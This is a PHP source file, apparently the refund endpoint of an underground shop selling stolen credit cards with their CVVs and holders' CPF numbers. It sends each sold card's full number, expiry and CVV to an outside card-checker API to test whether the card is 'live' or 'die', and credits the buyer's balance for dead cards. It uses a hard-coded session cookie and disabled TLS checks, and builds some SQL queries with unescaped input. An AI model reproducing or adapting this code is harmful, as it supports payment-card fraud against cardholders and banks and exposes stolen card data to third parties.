<?php
error_reporting(0);
set_time_limit(0);
require_once("../../includes/conexao.php");
date_default_timezone_set("America/Sao_Paulo");
#############################################
$card_token = mysqli_real_escape_string($conexao, $_POST['card_token']);
$usuario = $_SESSION['usuario'];

/////////// SQL COMECO ////////////

$sql = "SELECT * FROM `cardsvendidos` WHERE card_token = '$card_token'";
$busca = mysqli_query($conexao, $sql);
$dados2 = mysqli_fetch_assoc($busca);

///////// QQQ OK //////////////

$sql = "SELECT * FROM `usuarios`";
$busca = mysqli_query($conexao, $sql);
$dados = mysqli_fetch_assoc($busca);

$card = $dados2['card'];
$mes = $dados2['mes'];
$ano = $dados2['ano'];
$cvv = $dados2['cvv'];
$nomecard = $dados2['nome'];
$cpfcard = $dados2['cpf'];
$banco = $dados2['banco'];
$nivel = $dados2['nivel'];
$bandeira = $dados2['bandeira'];
$valorcc = $dados2['valorcc'];
$data_compra = $dados2['data_c'];
$status = $dados2['status'];

$data_atual = date("D/M/Y H:i:s");
$date = date("Y-m-d H:i:s");
$tempo = strtotime(''.$date.' + 5 minute');
$data_tempo = date('Y-m-d H:i:s', $tempo);
$data = date("d-m-Y H:i:s");

if(strtotime($data) < strtotime($data_compra)){
$json = ["success" => false, "message" => "Você tem apenas 5 minutos para trocar, tente novamente."];
die(json_encode($json));
}

if($status == 1){
$json = ["success" => false, "message" => "Você já solicitou reembolso, por favor escolha outro cartão para solicitar novamente."];
die(json_encode($json));
}

if($status == 2){
$json = ["success" => false, "message" => "Este cartão não pode ser reembolsado."];
die(json_encode($json));
}

if(empty($card_token)){
$json = ["success" => false, "message" => "O cartão não se encontra disponível no banco de dados."];
die(json_encode($json));
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://pladix-storebot.xyz/apis/cielov2.php?lista='.$card.'|'.$mes.'|'.$ano.'|'.$cvv.'');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'cookie: _fbp=fb.1.1645207034402.225941249; PHPSESSID=15e2d661dd79dff888e6c3ee633cf826',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36'));
$Gateway = curl_exec($ch);
$response = json_decode($Gateway, true);
$response = $response["message"];
curl_close($ch);
if(strpos($Gateway, 'live')){
$sql2 = "UPDATE cardsvendidos SET status='2' WHERE card_token = '$card_token'";
$result = mysqli_query($conexao, $sql2);
mysqli_query($conexao, "UPDATE usuarios SET saldo='$valorcc' WHERE usuarios='$usuario'");
$json = array("success" => false, "message" => "$response");
echo json_encode($json);
}
elseif(strpos($Gateway, 'die')){
mysqli_query($conexao, "UPDATE usuarios SET saldo='$valorcc' WHERE usuarios='$usuario'");
$json = array("success" => true, "message" => "$response");
echo json_encode($json);
if($dados["saldo"] > 0){
$saldo = intval($valorcc + $dados["saldo"]);
mysqli_query($conexao, "UPDATE usuarios SET saldo='$saldo' WHERE usuarios='$usuario'");
}
else{
mysqli_query($conexao, "UPDATE usuarios SET saldo='$valorcc' WHERE usuarios='$usuario'");
}

}


else{
$json = array("success" => false, "message" => "Ocorreu um problema na hora de realizar o reembolso.");
echo json_encode($json);
}




?>